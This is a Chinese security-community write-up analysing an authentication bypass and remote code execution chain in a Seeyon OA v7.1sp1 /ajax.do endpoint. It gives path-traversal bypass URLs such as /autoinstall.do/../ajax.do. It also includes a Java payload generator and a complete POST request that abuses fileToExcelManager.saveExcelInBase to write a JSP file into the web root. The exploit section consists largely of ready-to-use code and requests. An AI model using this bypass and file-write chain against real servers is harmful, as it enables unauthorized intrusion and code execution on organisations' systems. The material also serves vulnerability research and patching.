

# 某 OA ajax.do 处漏洞分析 - 先知社区

某 OA ajax.do 处漏洞分析



# ajax.do 处漏洞分析

本次分析版本 v7.1sp1  
/ajax.do 可以调用其他类的方法，但 ajax.do 默认是不允许未授权访问的  
[![](assets/1701606576-c083d8d493a69cfd53fbd5c01d47be13.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091052-510ddf10-85af-1.png)  
登录后访问是这样子的  
[![](assets/1701606576-2d6d44951ba46dbc1df1c7352c9517be.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091104-58422516-85af-1.png)

## 权限绕过

观察 web.xml 发现.do 结尾的路由会经过 SecurityFilter  
[![](assets/1701606576-2000c32f6838f5e39aeef55f6ccf3f21.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091126-6561e24a-85af-1.png)  
CTPSecurityFilter 类中做了校验，首先调用 isSpringController 进行校验  
[![](assets/1701606576-1b08eb07f4389200c124549950e805cf.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091136-6bb93152-85af-1.png)  
isSpringController 只要是.do 结尾的或者包含.do;jsessionid 都会返回 true  
[![](assets/1701606576-7fd9607d70b4ced9e7cc99c6b5d573b0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091149-73347266-85af-1.png)  
然后调用 SpringControllerAuthenticator#authenticate  
[![](assets/1701606576-a94b49cf00f343dbe159c177c411617f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091157-782280ba-85af-1.png)  
authenticate 方法中判断是否登录，未登录调用 this.isNeedlessCheckLogin  
[![](assets/1701606576-c3efa91f324b6499721b9fbf5172deef.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091207-7e3f3f92-85af-1.png)  
isNeedlessCheckLogin 中，如果路由是/ajax.do，会将 accessUrl 设置为 managerName 参数的值，这里没有传入，就是 null  
[![](assets/1701606576-5a4b838cba7aa790b33d926f9f21642c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091215-8296c196-85af-1.png)  
然后获取 needlessUrlMap  
[![](assets/1701606576-b8b1c6b9ac15943fb059c3737b236d6e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091225-88f1ff06-85af-1.png)  
遍历判断 accessUrl 是否在这个 map 中  
[![](assets/1701606576-4bd00fb13bb3c185c07b8de24d99e33c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091309-a2d74d04-85af-1.png)  
accessUrl 为 null 的时候直接抛出异常了，传个 managerName 进行测试  
[![](assets/1701606576-ce0616238a1e066058a42af22ba79cd7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091318-a864948e-85af-1.png)  
isNeedlessCheckLogin 返回 false 后赋值给 isAnnotationNeedlessLogin，会调用到 this.checkOnlineState  
[![](assets/1701606576-bdca8db502cac180457e2e74ad753a68.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091327-ade03468-85af-1.png)  
因为没有登录，所以 checkOnlineState 也会返回 false  
[![](assets/1701606576-92b4035bb327933fb9252595b8599f60.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091335-b2a028b4-85af-1.png)  
最后造成SpringControllerAuthenticator#authenticate返回false赋值给accept  
[![](assets/1701606576-40d2f667b8d95c8178a9085270e2d889.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091343-b729539c-85af-1.png)  
当 accept 为 false 时，将不会进行 filter 链的调用  
[![](assets/1701606576-074dc8bbe328122cae05a52d49fa02bd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091350-bb3121b8-85af-1.png)  
思考：在 isNeedlessCheckLogin 方法中，因为 accessUrl 不在 needlessUrlMap 中，导致返回 false，那么使 accessUrl 为 needlessUrlMap 中存在的 key，是否就会返回 true，例如：/main.do  
[![](assets/1701606576-82db502f3c546f048ad7747a65b82011.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091407-c5c3cd24-85af-1.png)  
那么 ajax.do 不在 needlessUrlMap 中，如何能够访问到 ajax.do 呢，可以利用 spring 的一个小 trick，在低版本 spring 中 alwaysUseFullPath 为默认值 false，本次分析版本中刚好 alwaysUseFullPath 也为 false  
[![](assets/1701606576-34d094e40f8bf30e97f948ccaa80cb18.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091414-c99bf25a-85af-1.png)  
当 alwaysUseFullPath 为 false 时，会调用 getPathWithinServletMapping 对 url 进行处理  
[![](assets/1701606576-b74ec542ec97f2ec481095980d5d347f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091420-cd09a978-85af-1.png)  
而 getPathWithinServletMapping 会对 uri 进行标准化处理，例如解码然后处理跨目录等，这就导致了可能的身份验证绕过  
成功绕过  
[![](assets/1701606576-d4176b06cccd69e486be5c2967f2562d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091431-d3beaab6-85af-1.png)

## ajax.do 调用流程

接下来分析 ajax.do 是如何调用类的  
/ajax.do 对应的是 com.seeyon.ctp.common.service.AjaxController 类  
[![](assets/1701606576-e35841d73b9d6313332bb2b5bf83ef4c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091451-dfb67d44-85af-1.png)  
调用其他类的逻辑主要在 ajaxAction 方法中  
[![](assets/1701606576-f4b8aef2083fa211b64ff33d906c5f13.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091456-e2dc9df0-85af-1.png)  
返回的字符是 outStr，outStr 调用了 invokeService 方法进行处理，接着如果传入了 ClientRequestPath 参数且不为黑名单的，会调用 ZipUtil.compressResponse 进行解压缩  
[![](assets/1701606576-6dc76b984f901ec7514694122f54ec19.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091502-e68849ea-85af-1.png)  
跟进 invokeService 方法，首先分别获取 serviceName、methodName、strArgs、compressType，然后根据传入的 compressType，调用 ZipUtil.uncompressRequest 对 strArgs 进行处理  
[![](assets/1701606576-5fa3e3b08a59ae51a8b67a6a3e05d8a6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091507-e9645884-85af-1.png)  
跟进 uncompressRequest，可以看到，如果 compressType 是 gzip 的话会进行 gzip 解压缩，如果不是的话，就会返回原本的数据  
[![](assets/1701606576-12de9275470d59d7792eb04e6570dba3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091514-eda6a226-85af-1.png)  
回到 invokeService 方法，根据传入的 serviceName 调用 getService 方法，然后返回一个对象  
[![](assets/1701606576-ccd15258f447e14cc8ff60af9bdd31b2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091520-f119c8c0-85af-1.png)  
跟进 getService 方法，调用了 AppContext.getBean 方法来获取对象  
[![](assets/1701606576-e25c5809b63443a71e7103b1e5f1a9cd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091525-f3c9c05c-85af-1.png)  
跟进 getBean 方法，从 beanCacheMap 中获取缓存好的对象  
[![](assets/1701606576-de7305189df2a647da766a48e5444581.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091530-f6ffea94-85af-1.png)  
beanCacheMap 中存放了 Manager 的名字和对应的对象  
[![](assets/1701606576-7cccaaefd76a51394fe79b3ea3aaa7dd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091535-fa0c8c42-85af-1.png)  
回到 getService 方法，获取到对象后，还会判断其是否继承 DataSource、Session、SessionFactory 三个类，并且不为空，满足条件后 return  
[![](assets/1701606576-83d328b093ac92a3f2e005eaaf9a1b75.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091542-fe23b198-85af-1.png)  
返回 invokeService 方法，获取到对象后，会调用 invokeMethod 方法，传入获取到的对象、方法名、参数、类名  
[![](assets/1701606576-40d1983d20214be59b47979c93ab6a38.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091547-01412f90-85b0-1.png)  
跟进 invokeMethod 方法，先将传入的 strArgs 参数解析成了 Object 对象，接着判断这个对象是否为 List 子类的实例，是的话会将 Object 强制转换成 List 对象，否则就会创建一个 ArrayList 对象。然后将传入的 Object 添加到 ArrayList 中  
[![](assets/1701606576-293dce136180c6309c5b5f11d8d8eac1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091553-04923306-85b0-1.png)  
经接着会将 serviceName + "_" + methodName + "_" + argsNum 作为键值在 this.candidateMethodCache 中获取已经缓存的方法，返回一个 list，如果获取到则会将传入的 strArgs 和 list 作为参数调用 this.findMethodAndArgs((List)l, (List)list)  
[![](assets/1701606576-630585b6e98248539f8c3d98f815bd62.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091558-079e2488-85b0-1.png)  
没获取到的话，会调用 this.judgeCandidate  
[![](assets/1701606576-6a6e0fecaf87970506fa3a9f6b0d47c1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091603-0aad6a1c-85b0-1.png)  
judgeCandidate 方法中会反射获取 services 的所有方法，有符合的方法名和符合的所需参数个数的话，就会将这个方法加入到 list 中，返回 list  
[![](assets/1701606576-e28736d4b6531f57912f81a90d83da97.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091608-0de7a13e-85b0-1.png)  
将返回的 list 作为参数，调用 findMethodAndArgs 方法  
[![](assets/1701606576-7576ba234b42fa7f31dd112a9046db06.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091617-12c95d3c-85b0-1.png)  
findMethodAndArgs 方法中，返回具体的 Method 对象和参数  
[![](assets/1701606576-b26be1ecd610503ebef2097c21cbdd55.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091626-1867a6e0-85b0-1.png)  
将键值加入缓存  
[![](assets/1701606576-1c7554b4e8f239b7d38cc46ddbb949ce.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091632-1bd67680-85b0-1.png)  
反射调用对应的方法  
[![](assets/1701606576-3d6cce95e2613283194fbc17cedc4e87.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091638-1f87ca68-85b0-1.png)  
总结：beanCacheMap 中存放了 Manager 的名字和对应的对象，可以通过传参调用对象的任意方法

## 修改权限绕过

当利用权限绕过的方式尝试调用对应的 Manager 时，会发现绕不过去了

```bash
/main.do/../ajax.do?method=ajaxAction&managerName=constDefManager&managerMethod=listPage
```

[![](assets/1701606576-05649b2eb41223e115f40dbcb5ddc46b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091730-3eafb694-85b0-1.png)  
进行调试分析，发现是因为传入了 method 参数后，method 为 ajaxAction  
[![](assets/1701606576-1cc117bd80a70bc860dea5c57d3e9dc4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091739-4402e40e-85b0-1.png)  
这里返回了 false  
[![](assets/1701606576-b22c37c5906b181b18e7ac13bc3e3780.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091745-474b5d76-85b0-1.png)  
key 为/main.do 时返回的方法中没有 ajaxAction，导致没有匹配成功返回 false，/main.do/../ajax.do 因为没传 method 参数，method 为 index，而 main.do 时返回的方法中含有 index，所以可以绕过  
[![](assets/1701606576-85098cf3845982719f9ef79ead86ecf5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091751-4b0b5060-85b0-1.png)  
继续观察发现 methods.contains("_") || methods.contains(method)，只要 2 个条件成立一个就行了，methods.contains("_") 就是表示 needlessUrlMap.get(key) 返回的 methods 中包含\*就行了  
而 autoinstall.do 刚好满足这个条件  
[![](assets/1701606576-128ddcf8bd92a99a811a03d5307d7924.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091802-51a03b84-85b0-1.png)  
所以可以利用 autoinstall.do 来进行权限绕过，利用 ajax.do 调用相应的 Manager

```bash
/autoinstall.do/../ajax.do?method=ajaxAction&managerName=constDefManager&managerMethod=listPage
```

[![](assets/1701606576-fd84672040dceb8f76a15e07c92265d3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091820-5c85661e-85b0-1.png)

## 漏洞利用

有很多 Manager 都存在漏洞，这里简单提一个 fileToExcelManager，其 saveExcelInBase 方法存在文件上传问题，从而造成 rce  
接受 3 个参数  
[![](assets/1701606576-75a46c3ad94cb65aa18a06b91b0220b2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091839-67e20e86-85b0-1.png)  
保存文件，并没有对文件名进行校验  
[![](assets/1701606576-88b6b71702a44dc476124571666b0b17.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091848-6cdb6b4e-85b0-1.png)  
需要注意的是这里写入的文件，会在前后加入 2 个双引号，直接插入 shell 是不行的，解析不了，我们可以利用换行符和双引号来闭合前后的双引号，从而使中间的 shell 内容能够解析  
构造 payload

```bash
import com.seeyon.ctp.common.excel.DataRecord;
import com.seeyon.ctp.common.log.CtpLogFactory;
import com.seeyon.ctp.util.ZipUtil;
import com.seeyon.ctp.util.json.JSONUtil;
import org.apache.commons.logging.Log;

import java.net.URLEncoder;
import java.util.ArrayList;

public class fileToExcelManagerPayload {
    private static final Log LOGGER = CtpLogFactory.getLog(fileToExcelManagerPayload.class);
    public static void main(String[] args) {

        DataRecord d = new DataRecord();
        String[] c = {"\"\r\n"+"<% out.println(\"ttttttttt\"); %>"+"\"\r\n"};
        d.setColumnName(c);
        String dd = JSONUtil.toJSONString(d);
        final ArrayList<Object> list = new ArrayList<>();
        list.add("../webapps/ROOT/x.jsp");
        list.add("\"\"");
        list.add(d);
        final String list1 = JSONUtil.toJSONString(list);
        String strArgs = ZipUtil.compressResponse(list1, "gzip", "UTF-8", LOGGER);
        System.out.println(URLEncoder.encode(strArgs));
        System.out.println("end");

    }
}
```

[![](assets/1701606576-2a957be7681324e103953a52f81cee4f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091916-7d76753e-85b0-1.png)

```bash
POST /seeyon/autoinstall.do/../ajax.do?method=ajaxAction&managerName=fileToExcelManager HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 6357

managerMethod=saveExcelInBase&managerName=fileToExcelManager&method=ajaxAction&requestCompress=gzip&arguments=%1F%C2%8B%08%00%00%00%00%00%00%00%5D%C2%8D%C3%81%0A%C3%820%10D%7F%C2%A5%2C%14%14B%C3%A2%C2%B9%C2%8A%C3%A7%1E%C3%84%C2%82%14%3C4%3D%C2%A46%C3%98H%C2%9A%C2%84dC%05%C3%B1%C3%9FM%09zp%C3%B64%C2%8F%C3%A5M%07%C2%94%C2%B2E%0E%C3%82%C2%B9%C3%80.M%C3%93%C2%B2%27%7D%04%07%04x%3A+%2F%C2%B8Y%1Dgs%16%C2%B3%C2%84%C2%AA%5B%C2%A9%C3%A7%C3%A6P%166%22u%5E%19%C3%94f%C3%83%01%C2%BF%C3%A1%C2%B0%C3%9D%17%C3%A51%C2%BFAO%60%14%28j%29%C3%86%C2%93%0A%C2%98%04%C2%89d%C3%A1U%C3%A1%04%C2%95%C2%89Z%13%08%C2%93%C2%94%C2%98%172%40%C2%85%C3%BAWB%1C%C3%9A%C2%BF%5EKu%C2%9F%C2%92nG%C3%80%C3%9Be%C3%95%C2%BE%C3%BB%0F%C3%8BJZ%C2%B7%C3%8A%00%00%00
```

[![](assets/1701606576-876d92b016cd1daa47ad75acc7a59605.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091942-8d7f8d3a-85b0-1.png)  
[![](assets/1701606576-d7c3c11f952e3fc8b7b24af3e0852f54.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231118091947-9006927e-85b0-1.png)
